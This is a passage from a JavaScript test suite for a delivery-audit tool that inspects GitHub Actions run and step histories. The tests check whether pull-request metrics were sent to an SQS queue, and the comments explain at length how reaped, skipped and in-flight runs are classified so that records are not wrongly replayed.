  // Not just cost: probing attempts after the current run already delivered
  // could demote the record back on an older attempt's verdict.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'cancelled', run_attempt: 4 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient(CURRENT(900, jobsWithStep('success')));
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(client.asked, ['/repos/praetorian-inc/guard/actions/runs/900/jobs?per_page=100']);
    assert.deepEqual(classes.delivered.map((r) => r.number), [5]);
    assert.equal(classes.delivered[0].sent_despite_conclusion, 'cancelled');
  });
});

test('recoverHiddenDeliveries: a run that died BEFORE the send stays failed instead of aborting the audit', () => {
  // The regression this option exists for. probeSqsStep treats an absent SQS
  // step as a RENAME and throws — correct for a successful run, fatal nonsense
  // for a failed one: 8 of 25 sampled guard failures die at `Set up job` with no
  // SQS step at all, so without requireStep:false every wide audit would exit 2.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 1 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient(CURRENT(900, jobsDiedEarly()));
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed.map((r) => r.number), [5]);
    assert.deepEqual(classes.delivered, []);
  });
});

test('probeSqsStep: an absent step is STILL fatal on the success path, so the rename detector survives', () => {
  // The other half of the pair above. requireStep defaults to true, so the
  // caller that verifies a SUCCESSFUL run keeps throwing — a rename makes every
  // one of ~1054 successes in a 90-day guard window throw, against 181 failures,
  // so the audit exits 2 long before any replay list is published.
  const client = attemptClient({ '/x/jobs?per_page=100': jobsDiedEarly() });
  return assert.rejects(
    () => probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900'),
    /renamed|no .* step/i,
  );
});

test("probeSqsStep: a 404 answers 'unknown' with NO flag to pass, at every call site", () => {
  // There used to be an `unreadableIsFatal` option, true by default, and this
  // pair of tests pinned both of its arms. It is gone: an unreadable step history
  // is undecided for that ONE record, never a decision and never fatal for the
  // fleet. Keeping the flag would also have left it dead — after the fix both call
  // sites want the same answer, and an option with one reachable value is a
  // liability, since the next reader has to work out that the other branch cannot
  // fire.
  //
  // 'unknown' is emphatically not 'not_sent': the walk turns it into
  // `unverifiable`, which replayList excludes, whereas 'not_sent' would leave the
  // row on the replay list and write to the prod queue.
  const client = attemptClient({});
  return probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900').then((v) => {
    assert.equal(v, 'unknown');
    assert.notEqual(v, 'not_sent');
  });
});

test("probeSqsStep: a readable run whose STEPS were reaped answers 'unknown_no_steps'", () => {
  // The inner reaping horizon. `/runs/{id}/jobs` keeps answering 200 long after
  // the step history is gone: total_count intact, one entry per job, and `steps`
  // PRESENT AS AN EMPTY ARRAY. Measured on this repo — 0 days old: 10 steps;
  // ~101 days: present; 340 days (run 17336557917): `steps: []` with the key
  // there. So the horizon sits inside RUN_HISTORY_DAYS=400, and the band where
  // the row is readable and its history is not is reachable by any operator using
  // --since, which the designed backfill does by construction.
  //
  // Before this arm, such a run took the RENAME branch — zero steps means no step
  // matches SQS_STEP, and on a success that was fatal — so ONE aged PR aborted
  // the whole fleet audit at exit 2 and told the operator "the reusable's step
  // names have changed". Every clause of that was wrong.
  const reaped = { total_count: 1, jobs: [{ steps: [] }] };
  const client = attemptClient({ '/x/jobs?per_page=100': reaped });
  return probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900').then((v) =>
    assert.equal(v, 'unknown_no_steps'),
  );
});

test('probeSqsStep: a reaped run does NOT blame the step name, and requireStep cannot override it', async () => {
  // Two properties in one fixture because they are the same claim from both sides.
  //
  // (1) On the SUCCESS path (requireStep defaults true) the old code threw the
  //     rename error. Asserting the verdict alone would not catch a regression
  //     that re-ordered the arms and threw again, so this asserts it resolves.
  // (2) With requireStep:false the old code answered 'not_sent' — leaving the row
  //     `failed` and REPLAYABLE. That is the writing direction, on evidence that
  //     was reaped rather than absent, so the step-less arm deliberately outranks
  //     requireStep. The cost is real and one-directional: a failed run whose
  //     history is gone under-reports as undecided instead of over-reporting as a
  //     gap. A run that died early still HAS step records (see jobsDiedEarly), so
  //     this only fires when retention removed the evidence.
  const reaped = { total_count: 1, jobs: [{ steps: [] }] };
  const client = attemptClient({ '/x/jobs?per_page=100': reaped });
  assert.equal(await probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900', { requireStep: true }), 'unknown_no_steps');
  assert.equal(await probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900', { requireStep: false }), 'unknown_no_steps');
});

test("probeSqsStep: an ALL-SKIPPED run is a decision, not reaped history", async () => {
  // Round 20. A skipped job and a reaped job are the SAME SHAPE over the wire —
  // both come back `steps: []` — so the step-less arm read every all-skipped run
  // as retention loss. Measured, one from each class:
  //
  //   public-workflows run 17336557917  conclusion=success  steps 0   (reaped, 340d)
  //   guard            run 31185145525  conclusion=skipped  steps 0   (skipped, fresh)
  //
  // `conclusion` is the only thing that separates them. This is not hypothetical
  // for the fleet as deployed: guard's caller is ONE job that calls the reusable,
  // on `pull_request_target: [closed]`, so every close-without-merge produces a
  // run whose only job skipped. Read as reaped, it marks the head undecided and
  // drops a genuinely undelivered PR out of the gap count.
  const skipped = { total_count: 1, jobs: [{ conclusion: 'skipped', steps: [] }] };
  const client = attemptClient({ '/x/jobs?per_page=100': skipped });
  assert.equal(await probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900', { requireStep: false }), 'not_sent');
  // requireStep cannot turn it back into the rename error either. An all-skipped
  // run can CONCLUDE success, and falling through on that path would abort the
  // whole fleet audit at exit 2 blaming the step name — the same misdiagnosis the
  // reaped arm was added to stop.
  assert.equal(await probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900', { requireStep: true }), 'not_sent');
});

test("probeSqsStep: a job that RAN yet has no steps is still 'unknown_no_steps'", async () => {
  // The other side of the discriminator, and the reason it is `every` and not
  // `some`. A run that mixes a skipped job with one that executed-but-has-no-steps
  // still carries reaping evidence, so it must NOT be downgraded to a decision.
  const mixed = {
    total_count: 2,
    jobs: [{ conclusion: 'skipped', steps: [] }, { conclusion: 'success', steps: [] }],
  };
  const client = attemptClient({ '/x/jobs?per_page=100': mixed });
  assert.equal(await probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900', { requireStep: false }), 'unknown_no_steps');

  // And an EMPTY job list keeps the undecided answer. `every` is vacuously true on
  // it, so without the length guard a run with no jobs at all would claim the
  // positive "it skipped, therefore it never sent" — a decision from no evidence.
  const none = { total_count: 0, jobs: [] };
  const c2 = attemptClient({ '/x/jobs?per_page=100': none });
  assert.equal(await probeSqsStep(c2, ACFG, 'guard', '/x/jobs', 'run 900', { requireStep: false }), 'unknown_no_steps');
});

test('headRunsByPr: carries run STATUS, because conclusion is null for finished-and-unfinished alike', () => {
  // `conclusion` is null for a queued run, an in-progress run AND nothing else —
  // it cannot distinguish "running" from "finished". The walk needs that
  // distinction to avoid reading a mid-flight run as a completed non-delivery, so
  // the projection has to carry `status` through. Pinned here because the field is
  // consumed two functions away, where dropping it would silently restore the old
  // behaviour rather than fail.
  const prs = [{ number: 1, head: { sha: 'aaa' } }];
  const runs = [
    { id: 1, head_sha: 'aaa', conclusion: null, status: 'in_progress', created_at: '2026-01-02T00:00:00Z' },
    { id: 2, head_sha: 'aaa', conclusion: 'failure', status: 'completed', created_at: '2026-01-01T00:00:00Z' },
  ];
  const got = headRunsByPr(prs, runs);
  assert.deepEqual(
    got.get(1).map((r) => [r.id, r.status]),
    [
      [1, 'in_progress'],
      [2, 'completed'],
    ],
  );
});

test('verifyPayloads: a sibling still IN PROGRESS is undecided, not a missing payload', async () => {
  // Round 20. `runsInRange` sets no `status` filter, so a queued or in-progress run
  // reaches the walk with `conclusion: null`; probeSqsStep derives
  // `requireStep = conclusion === 'success'`, which is false, so a send step that
  // simply HAS NOT RUN YET took the `!step && !requireStep` arm and returned the
  // DECISION `not_sent`. "Has not sent yet" is not "never sent".
  //
  // The cost lands on the replay path: an unrescued record stays on a list that
  // WRITES to the prod queue, so a sibling mid-delivery could get its PR delivered
  // a second time. Undecided is the honest answer, it already exists (exit 3, a
  // reason per record, excluded from replay), and it clears by itself.
  const client = jobsClient({
    111: { jobs: [{ conclusion: 'success', steps: [{ name: 'Set up job', conclusion: 'success' }] }] },
    999: { jobs: [{ conclusion: null, steps: [{ name: 'Set up job', conclusion: 'success' }] }] },
  });
  const heads = new Map([[1, [{ id: 999, conclusion: null, status: 'in_progress', run_attempt: 1 }]]]);
  const rec = { number: 1, run_id: 111, conclusion: 'failure', status: 'completed' };
  const v = await verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [rec], heads);
  assert.equal(v.get(111), 'unverifiable');
  // The REASON matters as much as the verdict: an operator reading this record has
  // to know it clears by re-running the audit, not by chasing a deleted run or
  // widening the window. Asserting only 'unverifiable' would pass on any of the
  // three wordings, including the jobs-unreadable fallback `.get()` returns for a
  // key that is not in UNDECIDED_VERDICTS.
  assert.equal(rec.unverifiable_reason, UNVERIFIABLE_RUN_IN_FLIGHT);
});

test('verifyPayloads: CONTROL — an in-progress sibling that ALREADY sent still decides the head', async () => {
  // The downgrade is ordered AFTER the `sent` return on purpose, and this is what
  // that ordering buys. A run still in progress may already have delivered, and a
  // send that IS found is a fact regardless of what else about the run is
  // unsettled. Without this control, "treat in-flight as undecided" could be
  // implemented as an early skip and nothing would notice it had stopped finding
  // real deliveries — the silent-clean direction.
  const client = jobsClient({
    111: { jobs: [{ conclusion: 'success', steps: [{ name: 'Set up job', conclusion: 'success' }] }] },
    999: { jobs: [{ conclusion: null, steps: [{ name: 'Send metrics to SQS', conclusion: 'success' }] }] },
  });
  const heads = new Map([[1, [{ id: 999, conclusion: null, status: 'in_progress', run_attempt: 1 }]]]);
  const v = await verifyPayloads(
    client,
    { owner: 'praetorian-inc' },
    'guard',
    [{ number: 1, run_id: 111, conclusion: 'failure', status: 'completed' }],
    heads,
  );
  assert.equal(v.get(111), 'sent');
});

test('probeSqsStep: a job with no steps ALONGSIDE one that has them is readable history', () => {
  // The step-less arm's predicate is "NO job carries ANY step", not "this job has
  // no steps" — and the difference is load-bearing in the direction that loses
  // findings. A skipped or never-started job legitimately carries zero steps, and
  // a run mixing one with executed jobs has perfectly readable history. A
  // per-job reading of the same rule would answer `unknown_no_steps` for those,
  // silently converting real deliveries into undecided records.
  const mixed = {
    total_count: 2,
    jobs: [{ steps: [] }, { steps: [{ name: SQS_STEP, conclusion: 'success' }] }],
  };
  const client = attemptClient({ '/x/jobs?per_page=100': mixed });
  return probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900').then((v) => assert.equal(v, 'sent'));
});

test('probeSqsStep: a TRUNCATED page that happens to be step-less still names pagination', () => {
  // Arm order, asserted rather than assumed. The step-less check sits AFTER the
  // truncation guard: a short read whose returned slice carries no steps is a
  // broken READ, not a reaped run, and diagnosing it as retention would send the
  // operator to narrow the window when the repair is pagination. Reversing the two
  // arms passes every other test in this file.
  const truncated = { total_count: 120, jobs: [{ steps: [] }] };
  const client = attemptClient({ '/x/jobs?per_page=100': truncated });
  return assert.rejects(
    () => probeSqsStep(client, ACFG, 'guard', '/x/jobs', 'run 900'),
    /truncated|needs pagination/,
  );
});

test('UNDECIDED_VERDICTS: every non-decision verdict probeSqsStep can return has a reason', () => {
  // The map is the single decision point for "is this verdict a decision", and
  // walkHeadForSend asks it by MEMBERSHIP rather than comparing against one
  // literal — because hand-comparing against 'unknown' alone is exactly how a
  // step-less run fell through as though it were decided. That only holds while
  // the map is complete, so this pins completeness at the source: scrape the
  // verdict literals out of probeSqsStep's own body, subtract the two decisions,
  // and require the remainder to be the map's key set.
  //
  // Scraped rather than retyped on purpose. A hand-written list of "the verdicts
  // that exist" is a second copy of the truth and goes stale silently — a third
  // undecided verdict added without a reason would then render as `unverifiable`
  // with an undefined explanation, which is unactionable, and no test would red.
  const src = readFileSync(join(HERE, 'audit-delivery.mjs'), 'utf8');
  const body = src.slice(src.indexOf('export async function probeSqsStep'));
  const fn = body.slice(0, body.indexOf('\n}\n'));
  const returned = new Set(
    // Per RETURN STATEMENT, with comparison operands removed first. The last line
    // is `return step.conclusion === 'success' ? 'sent' : 'not_sent'`, so a naive
    // "quoted literal after `return`" reads only the first of the two verdicts,
    // and taking every literal in the statement instead picks up `'success'` —
    // a step conclusion, not a verdict. Stripping `=== '...'` operands leaves
    // exactly the values the function can hand back.
    [...fn.matchAll(/\breturn ([^;]+);/g)].flatMap((m) =>
      [...m[1].replace(/[=!]==?\s*'[a-z_]+'/g, '').matchAll(/'([a-z_]+)'/g)].map((x) => x[1]),
    ),
  );
  // ANTI-VACUOUS: an extractor that grabbed the wrong region, or a rename of the
  // function, would leave `returned` empty and this test would assert nothing.
  assert.ok(returned.has('sent') && returned.has('not_sent'), `extractor drifted: ${[...returned]}`);
  returned.delete('sent');
  returned.delete('not_sent');
  assert.deepEqual([...returned].sort(), [...UNDECIDED_VERDICTS.keys()].sort());
  // And every reason is a usable sentence, not a placeholder: this string is what
  // an operator reads in the report.
  for (const [verdict, reason] of UNDECIDED_VERDICTS) {
    assert.ok(reason.length > 40, `${verdict} has no usable reason: ${reason}`);
  }
});

test('recoverHiddenDeliveries: UNREADABLE current jobs is UNVERIFIABLE, not left replayable', () => {
  // "Cannot read the run that concluded failure" must not silently become "it sent
  // nothing, go replay it" — that is the writing direction, and `failed` IS the
  // replay list. It used to throw instead, which protected against the replay at
  // the cost of the whole fleet's report; `unverifiable` protects against it and
  // keeps the report. The reason must be the 404 one, not the reaped one.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 1 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient({});
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed, []);
    assert.deepEqual(classes.unverifiable.map((r) => r.number), [5]);
    assert.equal(classes.unverifiable[0].unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
  });
});

test('recoverHiddenDeliveries: a REAPED current run reports the retention reason, not the 404 one', () => {
  // The reason is plumbed from the walk, not chosen at the call site, and the two
  // causes have DIFFERENT repairs: narrow the window vs. the run is gone. A single
  // constant for both — which is what a boolean `unreadable` flag forces — prints
  // "narrow the window with --since" at an operator whose run was deleted, or the
  // reverse. Same class as the rename misdiagnosis this fix started from.
  const classes = {
    delivered: [],
    failed: [{ number: 6, run_id: 901, conclusion: 'failure', run_attempt: 1 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/901/jobs?per_page=100': { total_count: 1, jobs: [{ steps: [] }] },
  });
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.unverifiable.map((r) => r.number), [6]);
    assert.equal(classes.unverifiable[0].unverifiable_reason, UNVERIFIABLE_STEPS_REAPED);
    assert.notEqual(classes.unverifiable[0].unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
  });
});

test('walkHeadForSend: the FIRST unreadable cause wins the reason, and a SEND still outranks both', async () => {
  // Two properties of the reason plumbing that no single-record test reaches.
  //
  // (1) The walk is ordered own-run, then siblings, then attempts — cheapest and
  //     most relevant first — so when several things are unreadable the reason
  //     reported is the one closest to what the operator asked about. Last-wins
  //     would report an ancient sibling's cause for the row in front of them.
  // (2) `unreadable` is returned ALONGSIDE `sent`, not instead of it: a send that
  //     IS found decides the head no matter what else could not be read. If an
  //     unreadable sibling could mask a found delivery, the record would fall to
  //     `unverifiable` and drop off the delivered list.
  const recs = [{ number: 7, run_id: 910, conclusion: 'failure', run_attempt: 1 }];
  const classes = { delivered: [], failed: [...recs], skipped_anomaly: [], payload_missing: [], unverifiable: [] };
  // Own run: steps reaped. Sibling: 404. First cause wins => the reaped reason.
  const heads = new Map([[7, [{ id: 910, conclusion: 'failure', run_attempt: 1, created_at: '2026-01-02T00:00:00Z' }, { id: 911, conclusion: 'success', run_attempt: 1, created_at: '2026-01-01T00:00:00Z' }]]]);
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/910/jobs?per_page=100': { total_count: 1, jobs: [{ steps: [] }] },
  });
  await recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads);
  assert.equal(classes.unverifiable[0].unverifiable_reason, UNVERIFIABLE_STEPS_REAPED);

  // Same shape, but the sibling DID send. The head is decided.
  const classes2 = { delivered: [], failed: [{ number: 7, run_id: 910, conclusion: 'failure', run_attempt: 1 }], skipped_anomaly: [], payload_missing: [], unverifiable: [] };
  const client2 = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/910/jobs?per_page=100': { total_count: 1, jobs: [{ steps: [] }] },
    '/repos/praetorian-inc/guard/actions/runs/911/jobs?per_page=100': jobsWithStep('success'),
  });
  await recoverHiddenDeliveries(client2, ACFG, 'guard', classes2, heads);
  assert.deepEqual(classes2.delivered.map((r) => r.number), [7]);
  assert.deepEqual(classes2.unverifiable, []);
  assert.equal(classes2.delivered[0].sent_by_run_id, 911);
});

test('assertActionsReadable: a 404 on the repo-level runs endpoint throws instead of yielding zero runs', () => {
  // The whole point, and round 16's ghPaged throw did NOT subsume it: with no
  // Actions grant the paginated walk is never reached. runsInRange asks a `gh`
  // probe for total_count first, `gh` answers a 404 with __missing, `total` falls
  // to 0 and the slice is SKIPPED — zero runs, no exception, indistinguishable
  // from "no runs", and every merged PR becomes a never_fired entry on the replay
  // list. This probe is the only layer that can see the difference.
  const client = attemptClient({});
  return assert.rejects(() => assertActionsReadable(client, ACFG, 'guard'), /actions:read|not readable/);
});

test('assertActionsReadable: a repo with ZERO runs is readable, not a failure', () => {
  // The distinction that makes the probe usable at all. A never-onboarded repo
  // answers 200 with total_count 0; only an inaccessible one 404s. Confusing the
  // two would abort the audit on every repo that simply is not a subject yet.
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs?per_page=1': { total_count: 0, workflow_runs: [] },
  });
  return assertActionsReadable(client, ACFG, 'guard').then((p) => {
    assert.equal(p.total_count, 0);
    // And it probed the REPO-level endpoint, not the workflow-specific one whose
    // 404 legitimately means "no caller here".
    assert.deepEqual(client.asked, ['/repos/praetorian-inc/guard/actions/runs?per_page=1']);
  });
});

test('needsPayloadProbe: BOTH rescue routes are excluded, and an ordinary success is not', () => {
  // One field per rescue route, and the reason they differ is not symmetric:
  // re-probing an attempt-rescued record actively DEMOTES it (the current run
  // failed), while re-probing a current-run-rescued one merely wastes a call.
  assert.equal(needsPayloadProbe({ run_id: 1 }), true);
  assert.equal(needsPayloadProbe({ run_id: 1, recovered_attempt: 1 }), false);
  assert.equal(needsPayloadProbe({ run_id: 1, sent_despite_conclusion: 'failure' }), false);
  // Falsy-but-present must still exclude: attempt 0 does not exist, but
  // `sent_despite_conclusion: ''` would be a truthiness trap for a `!rec.x` test.
  assert.equal(needsPayloadProbe({ run_id: 1, sent_despite_conclusion: '' }), false);
});

// ── sibling successful runs for one head ─────────────────────────────────────

test('headRunsByPr: keeps NON-success runs, newest first, and only for shared heads', () => {
  // The predecessor (successRunIdsByHead) filtered to successes, which is the
  // silent direction: a non-success sibling can have sent and then died in
  // post-job cleanup. This asserts the failure row is PRESENT, because that is
  // the row the old grouping dropped.
  const runs = [
    run(1, 'aaa', 'success', '2026-07-01T00:00:00Z'),
    run(2, 'aaa', 'failure', '2026-07-01T02:00:00Z'),
    run(3, 'aaa', null, '2026-07-01T01:00:00Z'),
    run(4, 'bbb', 'success', '2026-07-01T00:00:00Z'),
  ];
  const m = headRunsByPr([pr(5, '2026-07-01T03:00:00Z', 'aaa'), pr(6, '2026-07-01T03:00:00Z', 'bbb')], runs);
  assert.deepEqual(
    m.get(5).map((r) => r.id),
    [2, 3, 1],
  );
  assert.deepEqual(
    m.get(5).map((r) => r.conclusion),
    ['failure', null, 'success'],
  );
  // A head with a single run carries no information: the caller's own record IS
  // that row, so an entry would only invite a self-probe.
  assert.equal(m.has(6), false);
});

test('headRunsByPr: run_attempt is carried, and defaults to 1 when absent', () => {
  const runs = [
    { ...run(1, 'aaa', 'failure', '2026-07-01T00:00:00Z'), run_attempt: 3 },
    run(2, 'aaa', 'failure', '2026-07-01T01:00:00Z'),
  ];
  const m = headRunsByPr([pr(5, '2026-07-01T02:00:00Z', 'aaa')], runs);
  assert.deepEqual(
    m.get(5).map((r) => r.run_attempt),
    [1, 3],
  );
});

// A sibling entry in the shape headRunsByPr produces.
const sib = (id, conclusion, run_attempt = 1) => ({ id, conclusion, run_attempt });
const SIBS = new Map([[5, [sib(700, 'success'), sib(701, 'success')]]]);

test('verifyPayloads: a SIBLING successful run that sent rescues the head from payload_missing', () => {
  // dedupeByHead picks one success per head. When two runs succeeded for the same
  // head and only the other one sent, probing just the winner reports
  // payload_missing for a PR whose author DOES have their score.
  const recs = [{ number: 5, run_id: 700 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/701/jobs?per_page=100': jobsWithStep('success'),
  });
  const alt = new Map([[5, [sib(700, 'success'), sib(701, 'success')]]]);

  return verifyPayloads(client, ACFG, 'guard', recs, alt).then((v) => {
    assert.equal(v.get(700), 'sent');
    assert.equal(recs[0].sent_by_run_id, 701);
  });
});

test('verifyPayloads: siblings are only probed when the winner did not send', () => {
  const recs = [{ number: 5, run_id: 700 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('success'),
    '/repos/praetorian-inc/guard/actions/runs/701/jobs?per_page=100': jobsWithStep('success'),
  });
  return verifyPayloads(client, ACFG, 'guard', recs, SIBS).then((v) => {
    assert.equal(v.get(700), 'sent');
    assert.deepEqual(client.asked, ['/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100']);
  });
});

test('verifyPayloads: no sibling sent, so the verdict stays not_sent', () => {
  const recs = [{ number: 5, run_id: 700 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/701/jobs?per_page=100': jobsWithStep('skipped'),
  });
  return verifyPayloads(client, ACFG, 'guard', recs, SIBS).then((v) => {
    assert.equal(v.get(700), 'not_sent');
    assert.equal('sent_by_run_id' in recs[0], false);
  });
});

test('verifyPayloads: with no sibling map at all the behaviour is unchanged', () => {
  // The control for the parameter's default: every existing caller passes four
  // arguments, and the fifth must not change the answer.
  const recs = [{ number: 5, run_id: 700 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
  });
  return verifyPayloads(client, ACFG, 'guard', recs).then((v) => {
    assert.equal(v.get(700), 'not_sent');
  });
});

// ── siblings on the FAILED side (the round-9 finding) ────────────────────────
//
// The sibling map used to be built for successes only and handed to
// verifyPayloads only, so a `failed`/`skipped_anomaly` row — the rows that ARE
// replayed — never had its head's other runs looked at. Both halves were needed
// for the hole to be reachable, which is why closing one of them would not have
// closed it.

const failedRec = (over = {}) => ({
  number: 5,
  run_id: 800,
  conclusion: 'failure',
  run_attempt: 1,
  ...over,
});
const failedClasses = (rec) => ({
  delivered: [],
  failed: [rec],
  skipped_anomaly: [],
  payload_missing: [],
  unverifiable: [],
});

test('recoverHiddenDeliveries: a NON-SUCCESS sibling that sent rescues the PR', () => {
  // The finding in its most direct form. Every sibling of a `failed` row is
  // non-success BY CONSTRUCTION — dedupeByHead ranks success first, so a success
  // on this head would have been the kept row instead — which is exactly why a
  // successes-only sibling map could never rescue one of these.
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient({
    ...CURRENT(800, jobsDiedEarly()),
    '/repos/praetorian-inc/guard/actions/runs/801/jobs?per_page=100': jobsWithStep('success'),
  });
  const heads = new Map([[5, [sib(800, 'failure'), sib(801, 'cancelled')]]]);

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads).then(() => {
    assert.deepEqual(classes.failed, []);
    assert.deepEqual(classes.delivered.map((r) => r.number), [5]);
    assert.equal(rec.sent_by_run_id, 801);
    // The consequence: off the replay list, so no second copy in the prod queue.
    assert.equal(
      replayList({ ...classes, never_fired: [], skipped_anomaly: [] }).includes(5),
      false,
    );
  });
});

test("recoverHiddenDeliveries: a sibling's earlier ATTEMPT that sent also rescues the PR", () => {
  // The walk is head-wide AND attempt-exhaustive, so the two hiding places
  // compose rather than being two features. A sibling on attempt 2 whose attempt
  // 1 sent is reachable only if both halves are in the same traversal.
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient({
    ...CURRENT(800, jobsDiedEarly()),
    '/repos/praetorian-inc/guard/actions/runs/801/jobs?per_page=100': jobsDiedEarly(),
    '/repos/praetorian-inc/guard/actions/runs/801/attempts/1': { conclusion: 'failure' },
    '/repos/praetorian-inc/guard/actions/runs/801/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });
  const heads = new Map([[5, [sib(800, 'failure'), sib(801, 'failure', 2)]]]);

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads).then(() => {
    assert.deepEqual(classes.delivered.map((r) => r.number), [5]);
    assert.equal(rec.sent_by_run_id, 801);
    assert.equal(rec.sent_by_run_attempt, 1);
  });
});

test('recoverHiddenDeliveries: siblings are only probed once the own run has not sent', () => {
  // Cost pin. `failed` is 181 rows on a 90-day guard window and ~202 of its runs
  // share a head, so probing siblings unconditionally would be paid on every one.
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient({
    ...CURRENT(800, jobsWithStep('success')),
    '/repos/praetorian-inc/guard/actions/runs/801/jobs?per_page=100': jobsWithStep('success'),
  });
  const heads = new Map([[5, [sib(800, 'failure'), sib(801, 'failure')]]]);

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads).then(() => {
    assert.equal(rec.sent_despite_conclusion, 'failure');
    assert.deepEqual(client.asked, [
      '/repos/praetorian-inc/guard/actions/runs/800/jobs?per_page=100',
    ]);
  });
});

test("recoverHiddenDeliveries: a SIBLING's unreadable jobs is undecidable, not fatal", () => {
  // The asymmetry that makes widening the walk safe. Siblings and old attempts
  // are what GitHub reaps FIRST, so a throw here would abort a whole fleet audit
  // over evidence the row does not depend on. The own run stays fatal — see the
  // `UNREADABLE current jobs throws` test above, which is the other side.
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient(CURRENT(800, jobsDiedEarly()));
  const heads = new Map([[5, [sib(800, 'failure'), sib(801, 'failure')]]]);

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads).then(() => {
    assert.deepEqual(classes.failed, []);
    assert.deepEqual(classes.unverifiable.map((r) => r.number), [5]);
    assert.equal(rec.unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
  });
});

test('recoverHiddenDeliveries: the own run is probed FIRST, then siblings newest-first', () => {
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient({
    ...CURRENT(800, jobsDiedEarly()),
    '/repos/praetorian-inc/guard/actions/runs/801/jobs?per_page=100': jobsDiedEarly(),
    '/repos/praetorian-inc/guard/actions/runs/802/jobs?per_page=100': jobsDiedEarly(),
  });
  // headRunsByPr sorts newest-first and INCLUDES the own run; the walker filters
  // it out of the sibling tail rather than probing run 800 twice.
  const heads = new Map([[5, [sib(801, 'failure'), sib(800, 'failure'), sib(802, 'failure')]]]);

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads).then(() => {
    assert.deepEqual(client.asked, [
      '/repos/praetorian-inc/guard/actions/runs/800/jobs?per_page=100',
      '/repos/praetorian-inc/guard/actions/runs/801/jobs?per_page=100',
      '/repos/praetorian-inc/guard/actions/runs/802/jobs?per_page=100',
    ]);
    assert.deepEqual(classes.failed.map((r) => r.number), [5]);
  });
});

test('recoverHiddenDeliveries: a sibling that succeeded WITHOUT sending is not this row of payload_missing', () => {
  // `payload_missing` is a claim about THIS PR's payload, and a sibling run that
  // resolved no author is not evidence about it. The record stays `failed` — the
  // reported direction — rather than being quietly reclassified as a gap of a
  // different kind.
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient({
    ...CURRENT(800, jobsDiedEarly()),
    '/repos/praetorian-inc/guard/actions/runs/801/jobs?per_page=100': jobsWithStep('skipped'),
  });
  const heads = new Map([[5, [sib(800, 'failure'), sib(801, 'success')]]]);

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads).then(() => {
    assert.deepEqual(classes.payload_missing, []);
    assert.deepEqual(classes.failed.map((r) => r.number), [5]);
  });
});

test("recoverHiddenDeliveries: a sibling's successful ATTEMPT that sent nothing is not this row either", () => {
  // The test above cannot discriminate the `own` guard, and a mutation said so:
  // `ownLatestSuccess` is only ever assigned inside the ATTEMPT walk, so a sibling
  // whose CURRENT state succeeded never reaches that line at all. Dropping `own &&`
  // therefore left it green while sibling attempts silently earned this row a
  // payload_missing claim.
  //
  // Own run 800 died before the send and has no earlier attempt. Sibling 801 is at
  // attempt 2; its attempt 1 concluded success and sent nothing. That is a positive
  // not_sent about 801's payload and says nothing about #5's, so the record stays
  // `failed` — reported and replayable, rather than a quiet reclassification into a
  // gap whose repair is a map edit.
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient({
    ...CURRENT(800, jobsDiedEarly()),
    '/repos/praetorian-inc/guard/actions/runs/801/jobs?per_page=100': jobsDiedEarly(),
    '/repos/praetorian-inc/guard/actions/runs/801/attempts/1': { conclusion: 'success' },
